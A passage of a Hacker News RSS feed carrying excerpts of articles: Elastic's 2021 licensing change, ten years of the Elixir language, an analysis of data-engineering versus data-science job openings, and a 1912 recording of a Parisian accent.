</p><p>With Elastic Enterprise Search, we introduced App Search, a layer on top of Elasticsearch that simplifies building rich applications and provides powerful management interfaces for relevance tuning, as well as analytics on how it's being used. We also provide a free Workplace Search product that makes it easy to integrate and search the content sources that you use to run your life or company, like Google Workplace, Microsoft 365, Atlassian Jira and Confluence, and Salesforce.
</p><p>It is simply amazing that we've been able to build all of these capabilities and provide them for free to our community. It has been humbling to see the level of engagement and adoption around our products and how these new features have helped so many people and businesses succeed. And this was possible because the overwhelming majority of our community chose our default distribution under the Elastic License, where all these features are free and open.
</p><h2>Why change?</h2><p>As previously mentioned, over the last three years, the market has evolved and the community has come to appreciate that open source companies need to better protect their software in order to maintain a high level of investment and innovation. With the shift to SaaS as a delivery model, some cloud service providers have taken advantage of open source products by providing them as a service, without contributing back. This diverts funds that would have been reinvested into the product and hurts users and the community.
</p><p>Similar to our open source peers, we have lived this experience firsthand, from our trademarks being misused to outright attempts to splinter our community with “open” repackaging of our OSS products or even taking “inspiration” from our proprietary code. While each open source company has taken a slightly different approach to address this issue, they have generally modified their open source license in order to protect their investment in free software, while trying to preserve the principles of openness, transparency, and collaboration. Similarly, we are taking the natural next step of making a targeted change to how we license our source code. This change won't affect the vast majority of our users, but it will restrict cloud service providers from offering our software as a service.
</p><p>We expect that a few of our competitors will attempt to spread all kinds of FUD around this change. Let me be clear to any naysayers. We believe deeply in the principles of free and open products, and of transparency with the community. Our track record speaks to this commitment, and we will continue to build upon it.
</p><h2>The change</h2><p>Starting with the upcoming Elastic 7.11 release, we will be moving the Apache 2.0-licensed code of Elasticsearch and Kibana to be dual licensed under SSPL and the Elastic License, giving users the choice of which license to apply. SSPL is a source-available license created by MongoDB to embody the principles …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elastic.co/blog/licensing-change">https://www.elastic.co/blog/licensing-change</a></em></p>]]>
            </description>
            <link>https://www.elastic.co/blog/licensing-change</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776657</guid>
            <pubDate>Thu, 14 Jan 2021 14:29:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[10 years-ish of Elixir]]>
            </title>
            <description>
<![CDATA[
Score 417 | Comments 119 (<a href="https://news.ycombinator.com/item?id=25776525">thread link</a>) | @1_player
<br/>
January 14, 2021 | https://dashbit.co/blog/ten-years-ish-of-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/ten-years-ish-of-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> January 11th, 2021
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/elixir">elixir</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/broadway">broadway</a>, <a href="https://dashbit.co/blog/tags/nerves">nerves</a>, <a href="https://dashbit.co/blog/tags/liveview">liveview</a>, <a href="https://dashbit.co/blog/tags/membrane">membrane</a>
  </li>
</ul>
<p>
This past weekend, on January 9th, we celebrated 10 years since <a href="https://github.com/elixir-lang/elixir/commit/337c3f2d569a42ebd5fcab6fef18c5e012f9be5b">the first commit to the Elixir repository</a>. While I personally don’t consider <a href="https://elixir-lang.org/">Elixir</a> to be 10 years old yet - the language that became what Elixir is today <a href="https://github.com/elixir-lang/elixir/commit/6052352b6281752b905b30eb5b08fac0f51f68cd">surfaced only 14 months later</a> - a decade is a mark to celebrate!</p>
<p>
The goal of this post is to focus on the current state of some projects in the ecosystem and then briefly highlight a few of the exciting efforts coming over the next months.</p>
<h2>
Recap: The language goals</h2>
<p>
When I started working on Elixir, I personally had the ambition of using it for building scalable and robust web applications. However, I didn’t want Elixir to be tied to the web. My goal was to design an <em>extensible</em> language with a diverse ecosystem. Elixir aims to be a general purpose language and allows developers to extend it to new domains.</p>
<p>
Given Elixir is built on top of Erlang and Erlang is used for networking and distributed systems, Elixir would naturally be a good fit in those domains too, as long as I didn’t screw things up. The Erlang VM is essential to everything we do in Elixir, which is why <em>compatibility</em> has become a language goal too.</p>
<p>
I also wanted the language to be <em>productive</em>, especially by focusing on the tooling. Learning a functional programming language is a new endeavor for most developers. Consequently their first experiences getting started with the language, setting up a new project, searching for documentation, and debugging should go as smoothly as possible.</p>
<p>
Extensibility, compatibility, and productivity are the goals we built the language upon.</p>
<h2>
Recap: Elixir in production</h2>
<p>
Last year we started <a href="https://elixir-lang.org/cases.html">a series of articles on companies using Elixir in production on the official website</a>. As of today, we have 7 production cases listed with more coming this year! Overall it is very exciting to see many different companies using a variety of business models and industries running Elixir in production.</p>
<p>
Companies like <a href="https://www.brex.com/">Brex</a> (<a href="https://elixir-lang.org/blog/2020/06/23/growing-with-elixir-at-brex/">case</a>), <a href="https://discord.com/">Discord</a> (<a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">case</a>), <a href="https://getdivvy.com/">Divvy</a>, <a href="https://www.podium.com/">Podium</a>, and <a href="https://salesloft.com/">SalesLoft</a> have reached <a href="https://en.wikipedia.org/wiki/Unicorn_(finance)">“unicorn status”</a> and rely heavily on Elixir. Startups like <a href="https://www.joinblvd.com/">Boulevard</a> (<a href="https://soundcloud.com/elixirtalk/episode-166-feat-sean-stavropoulos">podcast</a>), <a href="https://community.com/">Community</a>, <a href="https://duffel.com/">Duffel</a> (<a href="https://elixir-lang.org/blog/2020/12/10/integrating-travel-with-elixir-at-duffel/">case</a>), <a href="https://www.ockam.io/">Ockam</a>, <a href="https://www.mux.com/">Mux</a>, <a href="https://ramp.com/">Ramp</a>, <a href="https://remote.com/">Remote</a>, and <a href="https://www.v7labs.com/">V7</a> (<a href="https://elixir-lang.org/blog/2021/01/13/orchestrating-computer-vision-with-elixir/">case</a>) also use Elixir and have received funding in the last year or two. Elixir is also used within known brands and enterprises such as <a href="https://bleacherreport.com/">Bleacher Report</a>, <a href="https://www.change.org/">Change.org</a> (<a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">case</a>), <a href="https://heroku.com/">Heroku</a> (<a href="https://elixir-lang.org/blog/2020/09/24/paas-with-elixir-at-Heroku/">case</a>), <a href="https://www.pagerduty.com/">PagerDuty</a>, <a href="https://www.pepsico.com/">PepsiCo</a>, and <a href="https://www.therealreal.com/">TheRealReal</a>.</p>
<p>
There is also a special category of startups that run Elixir alonside an open source model, such as <a href="https://plausible.io/">Plausible Analytics</a>, <a href="https://app.supabase.io/">Supabase</a>, <a href="https://logflare.app/">Logflare</a> (<a href="https://runninginproduction.com/podcast/11-logflare-is-a-log-management-and-event-analytics-platform">podcast</a>), and <a href="https://hex.pm/">Hex.pm</a> (<a href="https://runninginproduction.com/podcast/19-hexpm-is-elixirs-official-package-manager">podcast</a>) itself. Still on the open source front, you will find projects like <a href="https://pleroma.social/">Pleroma</a> and <a href="https://changelog.com/">Changelog</a>. There also many small scale and hobby projects that use Elixir for a productive and joyful development experience.</p>
<h2>
Recap: Diverse ecosystem</h2>
<p>
Today, Elixir has a diverse ecosystem that works on a wide range of domains and industries. Let’s take a look at some examples.</p>
<h3>
Web</h3>
<p>
Most developers are familiar with using Elixir for web development thanks to <a href="https://phoenixframework.org/">the Phoenix web framework</a>. Phoenix gained traction in the ecosystem because it was the first to fully leverage the language and the platform for building real-time applications besides the usual MVC (Model-View-Controller) offering.</p>
<p>
It all started with Phoenix Channels, as a bi-directional communication between clients and servers, and Phoenix PubSub, which uses Erlang’s distributed compatibilities to broadcast messages across nodes. As far as I know, Phoenix was the first major web framework to provide a multi-node web real-time solution completely out-of-the-box. Regardless if you are using one node or ten nodes, everything just works, with minimal configuration and dependencies.</p>
<p>
Phoenix has matured a lot since its first stable release. Phoenix v1.2 included <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Phoenix Presence</a>, that allows developers to track which users, IoT devices, etc are connected to your cluster right now. No databases or external dependencies required! This is one of the problems that look deceptively simple at first, but once you outline all scalability, performance, and fault-tolerance requirements, it <a href="https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/">becomes quite complex</a>. Luckily, Phoenix is running on a platform that excels at these problems, and I am not aware of any other framework that provides such a lean and elegant solution as part of its default stack.</p>
<p>
Most recently, <a href="https://github.com/phoenixframework/phoenix_live_view">Phoenix LiveView</a> was released and brought new ways to build rich, real-time user experiences with server-rendered HTML, inspiring developers to attempt similar solutions for other languages and frameworks. You can read the <a href="https://dockyard.com/blog/2018/12/12/phoenix-liveview-interactive-real-time-apps-no-need-to-write-javascript">original announcement</a> or <a href="https://www.phoenixframework.org/blog/build-a-real-time-twitter-clone-in-15-minutes-with-live-view-and-phoenix-1-5">learn how to build a real-time Twitter clone in 15 minutes</a>. As part of the <em>Live</em> family, we have also announced <a href="https://twitter.com/josevalim/status/1250846714665357315">Phoenix LiveDashboard</a>, making monitoring and instrumentation a first-class citizen for Phoenix applications.</p>
<h3>
Embedded and IoT</h3>
<p>
While I always expected Elixir to shine for building web applications, I was taken by surprise when I heard about the <a href="https://www.nerves-project.org/">Nerves platform</a> for creating high-end embedded applications. However, once I learned their premise, it all made sense: writing embedded systems <em>is</em> complicated. Reasoning about failures is hard. So what if we could leverage the decades of lessons learnt by Erlang/OTP to design embedded applications? What if a fault on the Wi-Fi driver could be fixed by having a supervisor simply restart it? After all, the first major use of Erlang/OTP was in an embedded system, the Ericsson AXD301 ATM switch.</p>
<p>
Nerves brings the Elixir ecosystem and the battle-tested Erlang VM to edge computing, providing a rich developer experience using proven technology. Nerves started as a one step process for turning an Elixir project into a complete software image for common hardware devices. Today, Nerves is being used in production in industrial automation, machine learning, consumer electronics and more, with <a href="https://farm.bot/">Farmbot</a> (<a href="https://elixir-lang.org/blog/2020/08/20/embedded-elixir-at-farmbot/">case</a>) and <a href="https://www.rosepoint.com/">Rose Point Navigation</a> being two of the most notable examples.</p>
<p>
The Nerves team also created <a href="https://www.nerves-hub.org/">NervesHub</a>, a fully open-source device management system. Combining all these technologies makes Elixir a comprehensive language for building end-to-end IoT platforms.</p>
<h3>
Data ingestion and pipelines</h3>
<p>
Shortly after Elixir v1.0 was released, the Elixir Core Team and I started looking into abstractions for tackling data ingestions and data pipelines in Elixir. We ran through a couple designs until we eventually <a href="https://elixir-lang.org/blog/2016/07/14/announcing-genstage/">landed on GenStage</a>: a behaviour for exchanging data with back-pressure between Elixir processes and external systems. For an introduction, make sure to check out <a href="https://youtu.be/srtMWzyqdp8?t=242">my keynote introducing both GenStage and Flow</a>.</p>
<p>
Today, almost 5 years later, GenStage has been used by many industries and has become one of the factors driving Elixir adoption. For example, you can read how both <a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">Discord</a> and <a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">Change.org</a> have built systems on Elixir and GenStage that handle spikes and run at massive scale.</p>
<p>
However, GenStage was just the beginning. In 2019, <a href="https://www.youtube.com/watch?v=ZOExnT1PYjs">we announced Broadway</a>, which is a higher-level abstraction on top of GenStage that makes building data ingestion pipelines a breeze. We originally released with Amazon SQS support. Nowadays, RabbitMQ, Google Cloud PubSub, Apache Kafka, and other sources (known as producers in Broadway terms) are also available.</p>
<h3>
Audio/Video streaming</h3>
<p>
Since the Erlang VM was designed for scalable network processing, one can expect to also be an excellent platform for audio and video streaming. However, if you also wanted to process and transform those streams on the fly, the situation becomes much more complicated as you likely have to integrate with native code.</p>
<p>
Luckily, the tables have turned when Erlang/OTP 20 was released a couple years ago with the so-called Dirty NIFs. The Erlang VM always had the ability to invoke native code, but this native code could not run for long, as to not interfere with the preemptive features of the Erlang runtime. Dirty NIFs allow developers to tag native code either as IO or CPU bound, which runs on specific threads. Between ports (I/O based), NIFs, Dirty NIFs, and remote nodes, developers now have many options to interface with native code with different performance and reliability guarantees. That’s exactly the foundation the <a href="http://www.membraneframework.org/">Membrane Framework</a> builds on top of.</p>
<p>
Membrane was extracted from RadioKit, a startup aiming at disrupting the radio broadcasting industry. Originally it focused on processing and mixing audio. Later, <a href="https://www.swmansion.com/">Software Mansion</a> acquired the framework and provided stable funding and a solid team to help it grow into a full-scale framework. Currently, it allows developers to process, transmit, broadcast, and transform audio and videos streams on the fly. Whether you are building a Twitch clone, a VOD application or a video conferencing system, Membrane provides a growing set of high-level abstractions and pre-made modules so you don’t have to dive into idiosyncrasies of particular codecs, protocols, and formats. </p>
<h2>
Looking ahead: what is coming in 2021</h2>
<p>
The year of 2021 looks very exciting for the Erlang Ecosystem and the Elixir community. In this section, we are going to mention some of the things we expect to see in 2021.</p>
<h3>
Erlang/OTP 24 with JIT</h3>
<p>
In September 2020, <a href="https://github.com/erlang/otp/pull/2745">Lukas Larsson and the Erlang/OTP team</a> announced a JIT compiler for the Erlang VM called BeamAsm. How faster the JIT will be in practice depends on your application but the results posted in the announcement are promising. To quote Lukas:</p>
<blockquote>
  <p>
If we run the JSON benchmarks found in the <a href="https://github.com/devinus/poison/tree/master/bench">Poison</a> or <a href="https://github.com/michalmuskala/jason/tree/master/bench">Jason</a>, BeamAsm achieves anything from 30% to 130% increase (average at about 70%) in the number of iterations per second for all Erlang/Elixir implementations. For some benchmarks, BeamAsm is even faster than the pure C implementation <a href="https://github.com/davisp/jiffy">jiffy</a>.  </p>
</blockquote>
<blockquote>
  <p>
More complex applications tend to see a more moderate performance increase, for instance, RabbitMQ is able to handle 30% to 50% more messages per second depending on the scenario.  </p>
</blockquote>
<p>
I have been running …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/ten-years-ish-of-elixir">https://dashbit.co/blog/ten-years-ish-of-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/ten-years-ish-of-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776525</guid>
            <pubDate>Thu, 14 Jan 2021 14:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We don't need data scientists, we need data engineers]]>
            </title>
            <description>
<![CDATA[
Score 692 | Comments 344 (<a href="https://news.ycombinator.com/item?id=25775872">thread link</a>) | @winkywooster
<br/>
January 14, 2021 | https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/ | <a href="https://web.archive.org/web/*/https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="11"><figure>
    
  <a href="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="world in data" title="" src="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg" srcset="https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-dad4f.jpg 240w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-1808a.jpg 480w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c6823.jpg 960w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-e8e5f.jpg 1440w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-54793.jpg 1920w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-c4df6.jpg 2880w,
https://www.mihaileric.com/static/nasa-Q1p7bh3SHj8-unsplash-1d801dd5a6a5e44b7503e433b3a540b5-85f3f.jpg 4256w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>Data. It’s everywhere and we’re <a href="https://techjury.net/blog/how-much-data-is-created-every-day/#gref">only getting more of it</a>. For the last 5-10 years, <em>data science</em> has attracted newcomers near and far trying to get a taste of that forbidden fruit. </p>
<p>But what does the state of <em>data science</em> hiring look like today?</p>
<p>Here’s the gist of the article in two-sentences for the busy reader.</p>
<p><strong>TLDR</strong>: There are <strong>70% more open roles</strong> at companies in <em>data engineering</em> as compared to <em>data science</em>. As we train the next generation of data and machine learning practitioners, let’s place more emphasis on engineering skills.</p>
<hr>
<p>As part of my work developing an <a href="https://www.confetti.ai/">educational platform</a> for data professionals, I think a lot about how the market for data-driven (machine learning and data science) roles is evolving. </p>
<p>In talking to dozens of prospective entrants to data fields including students at top institutions around the world, I’ve seen a tremendous amount of confusion around what skills are most important to help candidates stand out in the crowd and prepare for their careers. </p>
<p>When you think about it, a <em>data scientist</em> can be responsible for any subset of the following: machine learning modelling, visualization, data cleaning and processing (i.e. SQL wrangling), engineering, and production deployment. </p>
<p>How do you even begin to recommend a study curriculum for newcomers?</p>
<p>Data speaks louder than words. So I decided to do an analysis of the data roles being hired for at every company coming out of <a href="https://www.ycombinator.com/">Y-Combinator</a> since 2012. The questions that guided my research:</p>
<ul>
<li>What data roles are companies most frequently hiring for?</li>
<li>How in-demand is the conventional <em>data scientist</em> that we talk about so much?</li>
<li>Are the same skills that started the data revolution relevant today?</li>
</ul>
<p>If you want the full details and analysis, read on. </p>
<h2>Methodology</h2>
<p>I chose to do an analysis of YC portfolio companies that claim to make some sort of data work part of their value proposition. </p>
<p>Why focus on YC? Well, for starters, they do a good job of providing an easily searchable (and scrapable) <a href="https://www.ycombinator.com/companies/">directory of their companies</a>. </p>
<p>In addition, as a particularly forward-thinking incubator that has funded companies from around the world across domains for over a decade, I felt they provided a representative sample of the market with which to conduct my analyses. That being said, take what I say wit a grain of salt, as I didn’t analyze super-large tech companies.</p>
<p>I scraped the homepage URLs of every YC company since 2012, producing an initial pool of ~1400 companies. </p>
<p>Why stop at 2012? Well, 2012 was the year that <a href="https://en.wikipedia.org/wiki/AlexNet">AlexNet</a> won the ImageNet competition, effectively kickstarting the machine learning and data-modelling wave we are now living through. It’s fair to say that this birthed some of the earliest generations of data-first companies.</p>
<p>From this initial pool, I performed keyword filtering to reduce the number of relevant companies I would have to look through. In particular, I only considered companies whose websites included at least one of the following terms: AI, CV, NLP, natural language processing, computer vision, artificial intelligence, machine, ML, data. I also disregarded companies whose website links were broken. </p>
<p>Did this generate a ton of false positives? Absolutely! But here I was trying to prioritize high recall as much as possible, recognizing that I would do a more fine-grained manual inspection of the individual websites for relevant roles.</p>
<p>With this reduced pool, I went through every site, found where they were advertising jobs (typically a <em>Careers</em>, <em>Jobs</em>, or <em>We’re Hiring</em> page), and took note of every role that included data, machine learning, NLP, or CV in the title. This gave me a pool of about 70 distinct companies hiring for data roles. </p>
<p>One note here: it’s conceivable that I missed some companies as there were certain websites with very little information (typically those in stealth) that might actually be hiring. In addition, there were companies that didn’t have a formal <em>Careers</em> page but asked that prospective candidates reach out directly via email. </p>
<p>I disregarded both of these types of companies rather than reach out to them, so they are not part of this analysis.</p>
<p>Another thing: the bulk of this research was done towards the final weeks of 2020. Open roles may have changed as companies update their pages periodically. However, I don’t believe this will drastically impact the conclusions drawn. </p>
<h2>What Are Data Practitioners Responsible For?</h2>
<p>Before diving into the results, it’s worth spending some time clarifying what responsibilities each data role is typically responsible for. Here are the four roles we will spend our time looking at with a short description of what they do:</p>
<ul>
<li><em>Data scientist</em>: Use various techniques in statistics and machine learning to process and analyse data. Often responsible for building models to probe what can be learned from some data source, though often at a prototype rather than production level. </li>
<li><em>Data engineer</em>: Develops a robust and scalable set of data processing tools/platforms. Must be comfortable with SQL/NoSQL database wrangling and building/maintaining ETL pipelines.</li>
<li><em>Machine Learning (ML) Engineer</em>: Often responsible for both training models and productionizing them. Requires familiarity with some high-level ML framework and also must be comfortable building scalable training, inference, and deployment pipelines for models.</li>
<li><em>Machine Learning (ML) Scientist</em>: Works on cutting-edge research. Typically responsible for exploring new ideas that can be published at academic conferences. Often only needs to prototype new state-of-the-art models before handing off to ML engineers for productionization.</li>
</ul>
<h2>How Many Data Roles Are There?</h2>
<p>So what happens when we plot the frequency of each data role that companies are hiring for? The plot looks  like this:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies" title="" src="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png" srcset="https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-d182c.png 240w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-5220f.png 480w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-3d61e.png 960w,
https://www.mihaileric.com/static/all_roles-76753bdb67cdaac40a0ea69ffbe76267-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>What immediately stands out is how many more open <em>data engineer</em> roles there are compared to traditional <em>data scientists</em>. In this case, the raw counts correspond to companies hiring <strong>roughly 55% more</strong> for data engineers than data scientists, and roughly the same number of machine learning engineers as data scientists.</p>
<p>But we can do more. If you look at the titles of the various roles, there seems to be some repetition. </p>
<p>Let’s only provide coarse-grained categorization through role consolidation. In other words, I took roles whose descriptions were roughly equivalent and consolidated them under a single title. </p>
<p>That included the following set of equivalence relations: </p>
<ul>
<li><em>NLP engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>CV engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning engineer</em> (while the domains might be different, the responsiblities are roughly the same)</li>
<li><em>ML scientist</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Deep Learning researcher</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>ML intern</em> (the internship description very much seemed research-focused)</li>
<li><em>Data engineer</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data architect</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Head of data</em> <span><span><math><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span></span> <em>Data platform engineer</em></li>
</ul>
<figure>
    
  <a href="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies consolidated into coarse categories" title="" src="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png" srcset="https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-d182c.png 240w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-5220f.png 480w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-3d61e.png 960w,
https://www.mihaileric.com/static/consolidated_roles-d0609bd70c768ce428b0873ea5ff1bd3-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>If we don’t like dealing with raw counts, here are some percentages to put us at ease:</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="all machine learning, data science, data engineering roles at Y-Combinator companies normalized frequencies" title="" src="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png" srcset="https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-d182c.png 240w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-5220f.png 480w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-3d61e.png 960w,
https://www.mihaileric.com/static/normalized_consolidated_roles-48138e6d849e501e2823381e49ba06e1-7931f.png 985w" sizes="(max-width: 960px) 100vw, 960px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>I probably could have lumped <em>ML research engineer</em> into one of the <em>ML scientist</em> or <em>ML engineer</em> bins, but given that it was a bit of a hybrid role, I left it as is. </p>
<p>Overall the consolidation made the differences even more pronounced! There are <strong>~70%</strong> more open <em>data engineer</em> than <em>data scientist</em> positions. In addition, there are <strong>~40%</strong> more open <em>ML engineer</em> than <em>data scientist</em> positions. There are also only <strong>~30%</strong> as many <em>ML scientist</em> as <em>data scientist</em> positions. </p>
<h2>Takeaways</h2>
<p><em>Data engineers</em> are in increasingly high demand compared to other data-driven professions. In a sense, this represents an evolution for the broader field. </p>
<p>When machine learning become hot 🔥 5-8 years ago, companies decided they need people that can make classifiers on data. But then frameworks like <a href="https://www.tensorflow.org/">Tensorflow</a> and <a href="https://pytorch.org/">PyTorch</a> became really good, democratizing the ability to get started with deep learning and machine learning. </p>
<p>This commoditized the data modelling skillset. </p>
<p>Today, the bottleneck in helping companies get machine learning and modelling insights to production center on data problems. </p>
<p>How do you annotate data? How do you process and clean data? How do you move it from A to B? How do you do this every day as quickly as possible?</p>
<figure>
    
  <a href="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" target="_blank" rel="noopener">
  
  <span>
    <span>
      <img alt="patrick star moving data" title="" src="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png" srcset="https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-8c52f.png 240w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-0f208.png 480w,
https://www.mihaileric.com/static/patrick-951fdc9920aa2a6cc7b75e0959379665-321c9.png 720w" sizes="(max-width: 720px) 100vw, 720px">
    </span>
  </span>
  
  </a>
    
</figure>
<p>All that amounts to having good engineering skills. </p>
<p>This may sound boring and unsexy, but old-school software engineering with a bend toward data may be what we really need right now. </p>
<p>For years, we’ve become enamored with the idea of data professionals that breathe life into raw data thanks to cool demos and media hype. After all, when was the last time you saw a <a href="https://techcrunch.com/">TechCrunch</a> article about an ETL pipeline? </p>
<p>If nothing else, I believe solid engineering is something we don’t emphasize enough in data science job training or educational programs. In addition to learning how to use <em>linear_regression.fit()</em>, learn how to write a unit test too!</p>
<p>So does that mean you shouldn’t study data science? No. </p>
<p>What it means is that competition is going to be tougher. There are going to be fewer positions available for what is looking to be an abundance of newcomers to the market trained to do data science. </p>
<p>There will always be a need for people that can effectively analyze and extract actionable insights from data. But they have to be good. </p>
<p>Downloading a pretrained model off the Tensorflow website on the <a href="https://scikit-learn.org/stable/auto_examples/datasets/plot_iris_dataset.html">Iris dataset</a> probably is no longer enough to get that data science job. </p>
<p>It’s clear, however, with the large number of <em>ML engineer</em> openings that companies often want a hybrid data practitioner: someone that can build and deploy models. Or said more succinctly, someone that can use Tensorflow but can also build it from source.</p>
<p>Another takeaway here is that there just aren’t that many ML research positions. </p>
<p>Machine learning research tends to get its fair share of hype because that’s where all the cutting-edge stuff happens, all the <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">AlphaGo</a> and <a href="https://openai.com/blog/openai-api/">GPT-3</a> and what-not. </p>
<p>But for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/">https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</a></em></p>]]>
            </description>
            <link>https://www.mihaileric.com/posts/we-need-data-engineers-not-data-scientists/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775872</guid>
            <pubDate>Thu, 14 Jan 2021 13:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parisian Accent in 1912]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 157 (<a href="https://news.ycombinator.com/item?id=25775091">thread link</a>) | @paganel
<br/>
January 14, 2021 | https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912 | <a href="https://web.archive.org/web/*/https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>"C’est extraordinaire que j’aie une voix aussi traînarde, jamais je l’aurais cru ! On ne s’entend pas, absolument !" Dans ce document unique en son genre, un Parisien réagit à l'écoute de son propre accent, celui du 14e arrondissement, en 1912. Il est interviewé par le linguiste Ferdinand Brunot. </p><div>
            <p>Cette archive exceptionnelle est l’une des premières interviews sonores, le premier enregistrement d'un échange spontané, non lu. C’est aussi l’une des rares traces de l’accent parisien d’avant-guerre. En 1912, le linguiste Ferdinand Brunot veut enregistrer les dialectes des artisans. Ici, c’est le parler parisien qui l’intéresse, l’accent populaire des différents quartiers de la capitale. Louis Ligabue, tapissier dans le 14e arrondissement, a alors 37 ans, et note déjà l'embourgeoisement de son quartier.</p>

